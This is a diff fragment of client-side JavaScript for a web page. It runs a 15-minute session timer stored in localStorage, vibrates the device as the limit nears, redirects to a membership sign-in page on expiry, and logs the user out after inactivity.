+-------------------------- */
+
+(function avbEngine() {
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const hasInitParam =
+        urlParams.get("session") === "refresh" ||
+        urlParams.get("mode") === "init";
+
+    const keyAlreadyUsed = localStorage.getItem("avb_key_used");
+
+    if (hasInitParam && !keyAlreadyUsed) {
+        localStorage.removeItem("avb_expiry_time");
+        localStorage.removeItem("avb_redirected_to_avb");
+        localStorage.removeItem("avb_session_state");
+        
+        localStorage.setItem("avb_key_used", "true");
+    }
+
+    if (!localStorage.getItem("avb_expiry_time")) {
+        localStorage.setItem(
+            "avb_expiry_time",
+            Date.now() + 15 * 60 * 1000
+        );
+    }
+
+    let triggered = false;
+    let vibRunning = false;
+    let vibTimeout;
+
+    const startVibrationCycle = () => {
+        if (vibRunning) return;
+        vibRunning = true;
+
+        const loop = () => {
+            if (!vibRunning) return;
+
+            if (navigator.vibrate) {
+                navigator.vibrate([300, 100, 300]);
+            }
+
+            vibTimeout = setTimeout(loop, 15000);
+        };
+
+        loop();
+    };
+
+    const stopVibrationCycle = () => {
+        vibRunning = false;
+        if (vibTimeout) clearTimeout(vibTimeout);
+        if (navigator.vibrate) navigator.vibrate(0);
+    };
+
+    const check = () => {
+        const expiryTime = parseInt(
+            localStorage.getItem("avb_expiry_time"),
+            10
+        );
+
+        const remainingSec = Math.floor(
+            (expiryTime - Date.now()) / 1000
+        );
+
+        if (!triggered && remainingSec <= 360 && remainingSec > 0) {
+
+            triggered = true;
+
+            startVibrationCycle();
+
+            console.log("AVB warning triggered with vibration cycle");
+        }
+
+        // optional safety stop if time passes out of range
+        if (remainingSec <= 0 || remainingSec > 360) {
+            stopVibrationCycle();
+        }
+    };
+
+    check();
+    const avbInterval = setInterval(check, 1000);
+
+})();
+
+/* --------------------------
+SESSION GUARD (CLEANED)
+-------------------------- */
+
+(function sessionGuard() {
+
+    const check = () => {
+        const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+
+        if (!expiryTime) return;
+
+        if (Date.now() >= expiryTime) {
+
+            localStorage.removeItem("avb_expiry_time");
+            localStorage.removeItem("avb_redirected_to_avb");
+            localStorage.removeItem("avb_session_state");
+            // Note: We leave avb_key_used so they can't reuse the same link if they time out again
+
+            window.location.href =
+                "https://membership-signup.avalonflow.site/sign-in";
+        }
+    };
+
+    check();
+    guardInterval = setInterval(check, 5000);
+
+})();
+
+
+
+        /* ---------- Auto-Logout After 8 Hours of Inactivity ---------- */
+        const AUTO_LOGOUT_TIME = 60 * 60 * 1000; // 1 hour
+        let logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
+
+        function resetLogoutTimer(){
+            clearTimeout(logoutTimer);
+            logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
+        }
+
+        ["mousemove","keydown","scroll","click"].forEach(event => {
+            window.addEventListener(event, resetLogoutTimer);
+        });
+</script>
+</body>
+        </html>
+
+
